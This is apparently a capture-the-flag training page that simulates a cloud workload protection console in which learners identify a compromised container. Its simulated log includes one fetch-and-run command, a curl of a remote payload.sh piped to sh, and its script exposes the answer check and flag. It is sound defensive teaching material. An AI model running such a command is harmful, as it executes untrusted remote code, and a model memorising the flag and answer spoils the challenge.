<?php
// cloud-workload-protection-practical.php
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cloud Workload Console</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
<style>
:root {
    --bg-primary: #0b0f1a;
    --bg-secondary: #12182b;
    --bg-surface: #161d36;
    --text-primary: #e6e9f2;
    --text-secondary: #aab0d6;
    --text-muted: #7c83b6;
    --accent-primary: #6ae3ff;
    --accent-secondary: #8b7bff;
    --success: #3dff9a;
    --error: #ff5c5c;
    --warning: #ffd36a;
    --border-default: rgba(255,255,255,0.08);
    --glow-accent: 0 0 12px rgba(106,227,255,0.35);
}

* { box-sizing: border-box; margin: 0; padding: 0; }

body {
    background: var(--bg-primary);
    color: var(--text-primary);
    font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
    line-height: 1.5;
    padding: 24px;
}

.mono { font-family: "JetBrains Mono", monospace; }

.page-wrap {
    max-width: 1100px;
    margin: 0 auto;
    position: relative;
}

/* HEADER */
.header {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    margin-bottom: 20px;
    gap: 16px;
}
.header h1 {
    font-size: 1.6rem;
    font-weight: 700;
    color: var(--accent-primary);
}
.header .subtitle {
    color: var(--text-secondary);
    font-size: 0.95rem;
    margin-top: 4px;
}
.tutorial-btn {
    background: var(--bg-surface);
    border: 1px solid var(--border-default);
    color: var(--accent-primary);
    padding: 10px 16px;
    border-radius: 8px;
    font-size: 0.85rem;
    font-weight: 600;
    cursor: pointer;
    white-space: nowrap;
}
.tutorial-btn:hover {
    box-shadow: var(--glow-accent);
}

/* DESCRIPTION */
.description-box {
    background: var(--bg-surface);
    border: 1px solid var(--border-default);
    border-radius: 10px;
    padding: 18px 20px;
    margin-bottom: 20px;
    color: var(--text-secondary);
    font-size: 0.92rem;
}
.description-box strong { color: var(--text-primary); }

/* MAIN GRID */
.main-grid {
    display: grid;
    grid-template-columns: 260px 1fr 300px;
    gap: 16px;
    align-items: start;
}
@media (max-width: 900px) {
    .main-grid { grid-template-columns: 1fr; }
}

.panel {
    background: var(--bg-surface);
    border: 1px solid var(--border-default);
    border-radius: 10px;
    padding: 16px;
}
.panel h2 {
    font-size: 0.95rem;
    text-transform: uppercase;
    letter-spacing: 0.04em;
    color: var(--text-muted);
    margin-bottom: 12px;
}

/* WORKLOAD LIST */
#workload-list .workload-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 12px;
    border-radius: 8px;
    cursor: pointer;
    margin-bottom: 6px;
    border: 1px solid transparent;
    font-size: 0.88rem;
}
#workload-list .workload-item:hover {
    background: rgba(255,255,255,0.04);
}
#workload-list .workload-item.active {
    border-color: var(--accent-primary);
    background: rgba(106,227,255,0.07);
}
.status-dot {
    width: 9px;
    height: 9px;
    border-radius: 50%;
    flex-shrink: 0;
}
.status-dot.normal { background: var(--success); }
.status-dot.alert { background: var(--error); }
.workload-type {
    color: var(--text-muted);
    font-size: 0.75rem;
    display: block;
}

/* DETAIL PANEL */
#workload-detail-panel .detail-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 14px;
}
#workload-detail-panel .detail-header h3 {
    font-size: 1.1rem;
    color: var(--text-primary);
}
.badge {
    padding: 3px 10px;
    border-radius: 20px;
    font-size: 0.72rem;
    font-weight: 600;
}
.badge.normal { background: rgba(61,255,154,0.12); color: var(--success); }
.badge.alert { background: rgba(255,92,92,0.12); color: var(--error); }

.tabs {
    display: flex;
    gap: 6px;
    margin-bottom: 14px;
    border-bottom: 1px solid var(--border-default);
}
.tab-btn {
    background: none;
    border: none;
    color: var(--text-muted);
    padding: 8px 14px;
    font-size: 0.85rem;
    font-weight: 600;
    cursor: pointer;
    border-bottom: 2px solid transparent;
}
.tab-btn.active {
    color: var(--accent-primary);
    border-bottom-color: var(--accent-primary);
}
.tab-content { display: none; }
.tab-content.active { display: block; }

.log-line {
    font-size: 0.8rem;
    padding: 8px 10px;
    border-radius: 6px;
    background: rgba(255,255,255,0.03);
    margin-bottom: 6px;
    color: var(--text-secondary);
}
.log-line.flagged {
    border-left: 3px solid var(--error);
    color: var(--text-primary);
}

.fim-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px 10px;
    border-radius: 6px;
    background: rgba(255,255,255,0.03);
    margin-bottom: 6px;
    font-size: 0.8rem;
}
.fim-row.mismatch { border-left: 3px solid var(--error); }
.fim-row .hash { color: var(--text-muted); font-size: 0.72rem; }
.fim-row.mismatch .hash.current { color: var(--error); }

.placeholder-text {
    color: var(--text-muted);
    font-size: 0.85rem;
    font-style: italic;
}

/* ALERT FEED */
#alert-feed .alert-item {
    padding: 10px 12px;
    border-radius: 8px;
    background: rgba(255,255,255,0.03);
    margin-bottom: 8px;
    font-size: 0.78rem;
    border-left: 3px solid var(--text-muted);
}
#alert-feed .alert-item.info { border-left-color: var(--accent-secondary); }
#alert-feed .alert-item.warning { border-left-color: var(--warning); }
#alert-feed .alert-item.critical { border-left-color: var(--error); }
.alert-time { color: var(--text-muted); display: block; margin-bottom: 2px; }

/* QUARANTINE / STATUS AREA */
#quarantine-selector {
    margin-top: 20px;
    background: var(--bg-surface);
    border: 1px solid var(--border-default);
    border-radius: 10px;
    padding: 18px 20px;
}
#quarantine-selector h2 {
    font-size: 0.95rem;
    text-transform: uppercase;
    letter-spacing: 0.04em;
    color: var(--text-muted);
    margin-bottom: 14px;
}
.select-row {
    display: flex;
    flex-wrap: wrap;
    gap: 14px;
    margin-bottom: 14px;
}
select, .submit-btn {
    font-family: "Inter", sans-serif;
    font-size: 0.85rem;
    padding: 10px 14px;
    border-radius: 8px;
    border: 1px solid var(--border-default);
    background: var(--bg-primary);
    color: var(--text-primary);
}
.submit-btn {
    background: var(--accent-primary);
    color: var(--bg-primary);
    font-weight: 700;
    cursor: pointer;
    border: none;
}
.submit-btn:hover { box-shadow: var(--glow-accent); }

#feedback-area {
    margin-top: 12px;
    font-size: 0.85rem;
    min-height: 20px;
}
#feedback-area.wrong { color: var(--error); }
#feedback-area.right { color: var(--success); }

/* FLAG REVEAL */
#flag-reveal {
    display: none;
    margin-top: 20px;
    background: var(--bg-surface);
    border: 1px solid var(--success);
    border-radius: 10px;
    padding: 20px;
    text-align: center;
    box-shadow: 0 0 20px rgba(61,255,154,0.15);
}
#flag-reveal h2 {
    color: var(--success);
    font-size: 1.1rem;
    margin-bottom: 10px;
    text-transform: none;
    letter-spacing: normal;
}
#flag-reveal .flag-value {
    font-size: 1.2rem;
    font-weight: 600;
    color: var(--accent-primary);
    background: rgba(0,0,0,0.3);
    padding: 10px 18px;
    border-radius: 8px;
    display: inline-block;
    user-select: all;
}

/* SPOTLIGHT TUTORIAL */
.spotlight {
    position: fixed;
    border-radius: 8px;
    box-shadow: 0 0 0 9999px rgba(0,0,0,0.75);
    pointer-events: none;
    z-index: 9998;
    transition: none;
}
.tooltip-card {
    position: fixed;
    background: var(--bg-surface);
    border: 1px solid var(--accent-primary);
    border-radius: 10px;
    padding: 16px 18px;
    max-width: 300px;
    z-index: 9999;
    font-size: 0.85rem;
    box-shadow: 0 0 20px rgba(106,227,255,0.2);
}
.tooltip-card p { color: var(--text-secondary); margin-bottom: 12px; }
.tooltip-nav {
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.tooltip-nav button {
    background: none;
    border: 1px solid var(--border-default);
    color: var(--text-primary);
    padding: 6px 12px;
    border-radius: 6px;
    font-size: 0.78rem;
    cursor: pointer;
}
.tooltip-nav .next-btn {
    background: var(--accent-primary);
    color: var(--bg-primary);
    font-weight: 600;
    border: none;
}
.tooltip-step-count { color: var(--text-muted); font-size: 0.75rem; }

/* MODAL */
.modal-overlay {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.7);
    z-index: 10000;
    align-items: center;
    justify-content: center;
}
.modal-box {
    background: var(--bg-surface);
    border: 1px solid var(--accent-primary);
    border-radius: 12px;
    padding: 30px;
    max-width: 400px;
    text-align: center;
}
.modal-box h3 { color: var(--accent-primary); margin-bottom: 12px; }
.modal-box p { color: var(--text-secondary); margin-bottom: 18px; font-size: 0.88rem; }
.modal-box button {
    background: var(--accent-primary);
    color: var(--bg-primary);
    border: none;
    padding: 10px 22px;
    border-radius: 8px;
    font-weight: 700;
    cursor: pointer;
}
</style>
</head>
<body>

<div class="page-wrap">

    <!-- 1. TOP HEADER -->
    <div class="header">
        <div>
            <h1>Cloud Workload Console</h1>
            <p class="subtitle">Fleet monitoring dashboard, one workload in this environment has been compromised.</p>
        </div>
        <button class="tutorial-btn" id="tutorial-restart-btn">View Tutorial</button>
    </div>

    <!-- 2. DESCRIPTION SECTION -->
    <div class="description-box">
        <p><strong>What this represents:</strong> a live CWPP style console monitoring five cloud workloads: two VMs, two containers, and one serverless function.</p>
        <p style="margin-top: 8px;"><strong>Your goal:</strong> review the Alert Feed and each workload's Runtime Activity and File Integrity tabs, then identify which workload was compromised and the specific indicator that confirms it.</p>
    </div>

    <!-- 3. MAIN INTERACTIVE ENVIRONMENT -->
    <div class="main-grid">

        <!-- Workload list -->
        <div class="panel" id="workload-list">
            <h2>Workloads</h2>
            <div class="workload-item active" data-id="vm-web-01" data-status="normal">
                <span class="status-dot normal"></span>
                <div>
                    vm-web-01
                    <span class="workload-type">VM · internet-facing</span>
                </div>
            </div>
            <div class="workload-item" data-id="vm-db-02" data-status="normal">
                <span class="status-dot normal"></span>
                <div>
                    vm-db-02
                    <span class="workload-type">VM · internal</span>
                </div>
            </div>
            <div class="workload-item" data-id="ctr-api-gateway" data-status="normal">
                <span class="status-dot normal"></span>
                <div>
                    ctr-api-gateway
                    <span class="workload-type">Container</span>
                </div>
            </div>
            <div class="workload-item" data-id="ctr-worker-03" data-status="alert">
                <span class="status-dot alert"></span>
                <div>
                    ctr-worker-03
                    <span class="workload-type">Container</span>
                </div>
            </div>
            <div class="workload-item" data-id="fn-image-resize" data-status="normal">
                <span class="status-dot normal"></span>
                <div>
                    fn-image-resize
                    <span class="workload-type">Serverless function</span>
                </div>
            </div>
        </div>

        <!-- Workload detail panel -->
        <div class="panel" id="workload-detail-panel">
            <div class="detail-header">
                <h3 id="detail-title">vm-web-01</h3>
                <span class="badge normal" id="detail-badge">Normal</span>
            </div>
            <div class="tabs">
                <button class="tab-btn active" id="tab-runtime" data-tab="runtime">Runtime Activity</button>
                <button class="tab-btn" id="tab-fim" data-tab="fim">File Integrity</button>
                <button class="tab-btn" data-tab="status">Status</button>
            </div>

            <div class="tab-content active" id="content-runtime"></div>
            <div class="tab-content" id="content-fim"></div>
            <div class="tab-content" id="content-status"></div>
        </div>

        <!-- Alert feed -->
        <div class="panel" id="alert-feed">
            <h2>Alert Feed</h2>
            <div class="alert-item info">
                <span class="alert-time mono">10:02:14</span>
                fn-image-resize: cold start latency spike
            </div>
            <div class="alert-item warning">
                <span class="alert-time mono">10:04:51</span>
                vm-web-01: outbound connection to unfamiliar IP 203.0.113.77:4444
            </div>
            <div class="alert-item critical">
                <span class="alert-time mono">10:05:02</span>
                ctr-worker-03: unexpected child process spawned: /bin/sh -c "curl ..."
            </div>
            <div class="alert-item info">
                <span class="alert-time mono">10:06:10</span>
                vm-db-02: scheduled backup job started
            </div>
            <div class="alert-item critical">
                <span class="alert-time mono">10:07:44</span>
                ctr-worker-03: monitored file /app/config.yml hash mismatch
            </div>
        </div>
    </div>

    <!-- 4. FEEDBACK / QUARANTINE AREA -->
    <div id="quarantine-selector">
        <h2>Quarantine Decision</h2>
        <div class="select-row">
            <select id="workload-select">
                <option value="">Select compromised workload...</option>
                <option value="vm-web-01">vm-web-01</option>
                <option value="vm-db-02">vm-db-02</option>
                <option value="ctr-api-gateway">ctr-api-gateway</option>
                <option value="ctr-worker-03">ctr-worker-03</option>
                <option value="fn-image-resize">fn-image-resize</option>
            </select>
            <select id="indicator-select">
                <option value="">Select confirming indicator...</option>
                <option value="outbound">Unusual outbound connection</option>
                <option value="process">Unexpected process execution</option>
                <option value="fim">File integrity violation</option>
                <option value="backup">Backup anomaly</option>
            </select>
            <button class="submit-btn" id="submit-quarantine">Quarantine Workload</button>
        </div>
        <div id="feedback-area"></div>
    </div>

    <!-- 5. FLAG REVEAL AREA -->
    <div id="flag-reveal">
        <h2>Workload Quarantined</h2>
        <p style="color: var(--text-secondary); margin-bottom: 14px;">ctr-worker-03 has been isolated. File integrity violation confirmed on /app/config.yml.</p>
        <div class="flag-value mono">CBX{integrity_violated}</div>
    </div>

</div>

<!-- TUTORIAL SPOTLIGHT ELEMENTS -->
<div class="spotlight" id="spotlight" style="display:none;"></div>
<div class="tooltip-card" id="tooltip-card" style="display:none;">
    <p id="tooltip-text"></p>
    <div class="tooltip-nav">
        <span class="tooltip-step-count" id="tooltip-step-count"></span>
        <div>
            <button id="skip-tutorial-btn">Skip Tutorial</button>
            <button class="next-btn" id="next-step-btn">Next</button>
        </div>
    </div>
</div>

<!-- COMPLETION MODAL -->
<div class="modal-overlay" id="completion-modal">
    <div class="modal-box">
        <h3>Tutorial Complete</h3>
        <p>You're ready to start the challenge. Investigate the workloads and identify the breach.</p>
        <button id="start-challenge-btn">Start Challenge</button>
    </div>
</div>

<script>
// ============================================================
// WORKLOAD DATA
// ============================================================
const workloadData = {
    'vm-web-01': {
        title: 'vm-web-01',
        type: 'VM · internet-facing',
        status: 'normal',
        runtime: [
            { time: '09:58:02', text: 'nginx worker process started (pid 1841)', flagged: false },
            { time: '10:01:33', text: 'inbound connection from 198.51.100.20:443', flagged: false },
            { time: '10:04:51', text: 'outbound connection to 203.0.113.77:4444', flagged: true },
            { time: '10:09:12', text: 'nginx access log rotated', flagged: false }
        ],
        fim: [
            { file: '/etc/nginx/nginx.conf', baseline: 'a1f9c3d0e2b7', current: 'a1f9c3d0e2b7', mismatch: false },
            { file: '/etc/passwd', baseline: '5f2e88a01c3d', current: '5f2e88a01c3d', mismatch: false }
        ]
    },
    'vm-db-02': {
        title: 'vm-db-02',
        type: 'VM · internal',
        status: 'normal',
        runtime: [
            { time: '10:00:00', text: 'postgres autovacuum started', flagged: false },
            { time: '10:06:10', text: 'scheduled backup job started', flagged: false },
            { time: '10:14:45', text: 'scheduled backup job completed', flagged: false }
        ],
        fim: [
            { file: '/etc/postgresql/postgresql.conf', baseline: 'c9902bfe11aa', current: 'c9902bfe11aa', mismatch: false },
            { file: '/var/lib/postgresql/pg_hba.conf', baseline: '3ba701fd9e44', current: '3ba701fd9e44', mismatch: false }
        ]
    },
    'ctr-api-gateway': {
        title: 'ctr-api-gateway',
        type: 'Container',
        status: 'normal',
        runtime: [
            { time: '09:55:20', text: 'container started, entrypoint /app/gateway', flagged: false },
            { time: '10:03:41', text: 'health check passed', flagged: false }
        ],
        fim: [
            { file: '/app/gateway.yml', baseline: 'e40b2a9c7710', current: 'e40b2a9c7710', mismatch: false }
        ]
    },
    'ctr-worker-03': {
        title: 'ctr-worker-03',
        type: 'Container',
        status: 'alert',
        runtime: [
            { time: '09:57:10', text: 'container started, entrypoint /app/worker', flagged: false },
            { time: '10:05:02', text: 'unexpected child process spawned: /bin/sh -c "curl http://203.0.113.77/payload.sh | sh"', flagged: true },
            { time: '10:05:09', text: 'new outbound connection to 203.0.113.77:80', flagged: true }
        ],
        fim: [
            { file: '/app/config.yml', baseline: '7d19aa20ff31', current: '9c4402b8e0aa', mismatch: true },
            { file: '/app/worker.py', baseline: 'b810f3c2a901', current: 'b810f3c2a901', mismatch: false }
        ]
    },
    'fn-image-resize': {
        title: 'fn-image-resize',
        type: 'Serverless function',
        status: 'normal',
        runtime: [
            { time: '10:02:14', text: 'cold start latency spike (612ms)', flagged: false },
            { time: '10:02:15', text: 'invocation completed successfully', flagged: false }
        ],
        fim: [
            { file: '/function/handler.py', baseline: '44d7e0b1229f', current: '44d7e0b1229f', mismatch: false }
        ]
    }
};

let currentWorkloadId = 'vm-web-01';
let currentTab = 'runtime';
let panelsInteracted = new Set(); // tracks which workloads' tabs have been viewed

function renderWorkload(id) {
    const data = workloadData[id];
    currentWorkloadId = id;

    document.getElementById('detail-title').textContent = data.title;
    const badge = document.getElementById('detail-badge');
    badge.textContent = data.status === 'alert' ? 'Alert' : 'Normal';
    badge.className = 'badge ' + data.status;

    // Runtime tab
    const runtimeEl = document.getElementById('content-runtime');
    runtimeEl.innerHTML = data.runtime.map(r =>
        `<div class="log-line ${r.flagged ? 'flagged' : ''} mono">
            <span style="color: var(--text-muted);">${r.time}</span> ${r.text}
        </div>`
    ).join('');

    // FIM tab
    const fimEl = document.getElementById('content-fim');
    fimEl.innerHTML = data.fim.map(f =>
        `<div class="fim-row ${f.mismatch ? 'mismatch' : ''}">
            <span>${f.file}</span>
            <span class="hash mono">baseline: ${f.baseline} ${f.mismatch ? '<br><span class=\"current\">current: ' + f.current + '</span>' : ''}</span>
        </div>`
    ).join('');

    // Status tab
    const statusEl = document.getElementById('content-status');
    statusEl.innerHTML = `<p class="placeholder-text">Overall health: <strong style="color: ${data.status === 'alert' ? 'var(--error)' : 'var(--success)'}">${data.status === 'alert' ? 'Alert' : 'Normal'}</strong></p>`;

    // active item highlight
    document.querySelectorAll('#workload-list .workload-item').forEach(item => {
        item.classList.toggle('active', item.dataset.id === id);
    });

    panelsInteracted.add(id);
}

function switchTab(tab) {
    currentTab = tab;
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.tab === tab);
    });
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.toggle('active', content.id === 'content-' + tab);
    });
}

document.querySelectorAll('#workload-list .workload-item').forEach(item => {
    item.addEventListener('click', () => renderWorkload(item.dataset.id));
});

document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => switchTab(btn.dataset.tab));
});

renderWorkload('vm-web-01');

// ============================================================
// QUARANTINE SUBMISSION / FLAG REVEAL
// ============================================================
document.getElementById('submit-quarantine').addEventListener('click', () => {
    const workload = document.getElementById('workload-select').value;
    const indicator = document.getElementById('indicator-select').value;
    const feedback = document.getElementById('feedback-area');

    if (!workload || !indicator) {
        feedback.textContent = 'Select both a workload and an indicator before submitting.';
        feedback.className = 'wrong';
        return;
    }

    if (workload === 'ctr-worker-03' && indicator === 'fim') {
        feedback.textContent = 'Correct. Quarantine action confirmed.';
        feedback.className = 'right';
        document.getElementById('flag-reveal').style.display = 'block';
        document.getElementById('flag-reveal').scrollIntoView({ behavior: 'smooth', block: 'center' });
    } else {
        feedback.textContent = 'That does not match the evidence. Review the Runtime Activity and File Integrity tabs again.';
        feedback.className = 'wrong';
    }
});

// ============================================================
// SPOTLIGHT TUTORIAL SYSTEM
// ============================================================
const tutorialSteps = [
    { targetId: 'workload-list', text: 'This is your fleet of monitored cloud workloads. VMs, containers, and serverless functions all appear here, just like in a real CWPP console.' },
    { targetId: 'alert-feed', text: "Runtime protection surfaces alerts here in real time. Read each one carefully, they're your first clue to what's wrong." },
    { targetId: 'workload-detail-panel', text: "Click any workload to inspect its Runtime Activity and File Integrity status in detail." },
    { targetId: 'tab-runtime', text: 'Runtime Activity shows processes and network connections. This is how you catch unusual behavior as it happens.' },
    { targetId: 'tab-fim', text: "File Integrity Monitoring compares a file's current hash to its trusted baseline. A mismatch means the file changed without authorization." },
    { targetId: 'quarantine-selector', text: "Once you've identified the compromised workload and the indicator that confirms it, submit your finding here to quarantine it." }
];

let currentStep = 0;
let tutorialActive = false;

function positionSpotlight(el) {
    const rect = el.getBoundingClientRect();
    const padding = 8;
    const spotlight = document.getElementById('spotlight');
    spotlight.style.top = (rect.top - padding) + 'px';
    spotlight.style.left = (rect.left - padding) + 'px';
    spotlight.style.width = (rect.width + padding * 2) + 'px';
    spotlight.style.height = (rect.height + padding * 2) + 'px';
    spotlight.style.display = 'block';

    const tooltip = document.getElementById('tooltip-card');
    tooltip.style.display = 'block';

    // decide placement
    const tooltipWidth = 300;
    let top = rect.bottom + 16;
    let left = rect.left;

    if (top + 150 > window.innerHeight) {
        top = rect.top - 16;
        tooltip.style.top = '';
        tooltip.style.bottom = (window.innerHeight - rect.top + 16) + 'px';
    } else {
        tooltip.style.bottom = '';
        tooltip.style.top = top + 'px';
    }

    if (left + tooltipWidth > window.innerWidth) {
        left = window.innerWidth - tooltipWidth - 20;
    }
    if (left < 10) left = 10;
    tooltip.style.left = left + 'px';
}

function showStep(index) {
    if (index >= tutorialSteps.length) {
        endTutorial();
        document.getElementById('completion-modal').style.display = 'flex';
        return;
    }
    currentStep = index;
    const step = tutorialSteps[index];
    let el = document.getElementById(step.targetId);

    const rect = el.getBoundingClientRect();
    const isVisible = rect.top >= 0 && rect.bottom <= window.innerHeight;
    if (!isVisible) {
        el.scrollIntoView({ behavior: 'smooth', block: 'center' });
        setTimeout(() => {
            positionSpotlight(el);
            document.getElementById('tooltip-text').textContent = step.text;
            document.getElementById('tooltip-step-count').textContent = (index + 1) + ' of ' + tutorialSteps.length;
        }, 300);
    } else {
        positionSpotlight(el);
        document.getElementById('tooltip-text').textContent = step.text;
        document.getElementById('tooltip-step-count').textContent = (index + 1) + ' of ' + tutorialSteps.length;
    }
}

function startTutorial() {
    tutorialActive = true;
    currentStep = 0;
    showStep(0);
}

function endTutorial() {
    tutorialActive = false;
    document.getElementById('spotlight').style.display = 'none';
    document.getElementById('tooltip-card').style.display = 'none';
}

document.getElementById('next-step-btn').addEventListener('click', () => {
    showStep(currentStep + 1);
});

document.getElementById('skip-tutorial-btn').addEventListener('click', () => {
    endTutorial();
});

document.getElementById('tutorial-restart-btn').addEventListener('click', () => {
    startTutorial();
});

document.getElementById('start-challenge-btn').addEventListener('click', () => {
    document.getElementById('completion-modal').style.display = 'none';
});

window.addEventListener('resize', () => {
    if (tutorialActive) {
        const step = tutorialSteps[currentStep];
        const el = document.getElementById(step.targetId);
        if (el) positionSpotlight(el);
    }
});

// Auto-start tutorial on first load
window.addEventListener('load', () => {
    startTutorial();
});
</script>

</body>
</html>
